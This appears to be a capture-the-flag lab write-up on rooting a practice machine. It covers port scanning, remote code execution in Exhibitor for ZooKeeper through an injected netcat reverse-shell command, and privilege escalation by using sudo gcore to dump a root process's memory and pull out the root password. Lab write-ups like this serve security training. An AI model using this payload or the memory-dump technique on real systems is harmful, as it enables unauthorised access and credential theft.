# Main
This is an overview of my methods in rooting a machine from pg. I have purposefully left the names of all pg machines out in titles and replaced them with generic names to avoid any spoiling while still maintaining the opportunity to share my methods, skills, and journey. 

## Initial

### Port scans:
```
PORT     STATE SERVICE
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
631/tcp  open  ipp
2222/tcp open  EtherNetIP-1
8080/tcp open  http-proxy
8081/tcp open  blackice-icecap

Host script results:
| smb-vuln-regsvc-dos: 
|   VULNERABLE:
|   Service regsvc in Microsoft Windows systems vulnerable to denial of service
|     State: VULNERABLE
|       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
|       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
|       while working on smb-enum-sessions.
|_          
|_smb-vuln-ms10-061: false
|_smb-vuln-ms10-054: false
```

After discovering a webserver running on port 8081 during initial enumeration, I navigated to that page in the browser and discovered a portal for something called 'Exhibitor for ZooKeeper.' Immediately after googling this, it was discovered that the software is vulnerable to RCE.

---
Potential Exploits:
https://www.exploit-db.com/exploits/48654

### Web - initial:
```
Exhibitor for ZooKeeper

https://www.exploit-db.com/exploits/48654
```

The exploitdb PoC says to navigate to the config tab and to enter a reverse shell surrounded with '$()'

I started a netcat listener locally and after entering the reverse shell command in the javascript.env field and then 'committing,' I had a reverse shell.

```
$(/bin/nc -e /bin/sh 192.168.49.133 4444 &)
```
---
### Foothold (overview):
1. scan --> web server on 8081
2. exhibitor for zookeeper --> RCE
3. RCE --> revshell

---

### Privilege Escalation / Post-Exploit

After gaining a foothold on the target system via RCE, I ran some basic privesc enumeration commands.
```bash
find . -perm /4000 2>/dev/null

ps aux | grep root

sudo -l
```
Running 'sudo -l' returned interesting results:
```
User c####s may run the following commands on p####n:
    (ALL) NOPASSWD: /usr/bin/gcore
####@####:/$ ps -ef
```
Checking gtfobins, a method of privilege escalation was found relating to the gcore binary:
https://gtfobins.github.io/gtfobins/gcore/#sudo

After a bit of research it was discovered that gcore produces memory dumps and with sudo privileges, it is possible to dump processes running under privileged users, potentially exposing passwords and sensitive information. The potentially tricky part in this is identifying the right process to dump, but this machine had a seemingly-perfect process to dump, 'password-store.'
```
$ ps -ef
root       493     1  0 14:13 ?        00:00:00 /usr/bin/password-store

$ sudo gcore 493

$ strings core*


001 Password: root:
##PASSWORD_REDACTED##
```
After dumping this process, I ran strings on the output and after combing through the results, the password for root user was discovered.
After this, escalation was as simple as switching to root user and entering the password. 
```

$ su root

$ root@pelican:~# cat proof.txt
##HASH_REDACTED##
```